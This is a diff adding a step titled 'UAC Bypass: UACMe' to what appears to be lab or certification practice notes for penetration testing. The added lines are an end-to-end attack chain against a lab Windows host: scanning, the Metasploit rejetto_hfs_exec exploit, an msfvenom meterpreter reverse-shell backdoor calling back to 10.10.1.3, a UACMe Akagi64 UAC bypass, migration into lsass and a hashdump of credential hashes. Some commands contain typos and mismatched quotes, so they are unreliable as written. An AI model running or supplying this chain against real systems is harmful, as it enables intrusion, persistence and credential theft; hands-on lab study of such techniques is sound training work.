@@ -545,9 +545,41 @@ dir
 type flag.txt
 ```
 
-31)  
+31)  UAC Bypass: UACMe
 ```
-
+cat /root/Desktop/target
+nmap 10.0.27.103
+nmap -sV -p 80 10.0.27.103
+searchsploit hfs
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS 10.0.27.103
+explot
+getuid
+sysinfo
+ps -S explorer.exe
+migrate 2444
+getsystem
+shell
+net localgroup administrators
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe
+file ''backdoor.exe'
+CTRL + C
+cd C:\\Users\\admin\\AppData\\Local\\Temp
+upload /root/Desktop/tools/UACME/Akagi64.exe .
+upload /root/backdoor.exe .
+ls
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.1.3
+set LPORT 4444
+exploit
+shell
+Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+ps -S lsass.exe
+migrate 680
+hashdump
 ```
 
 
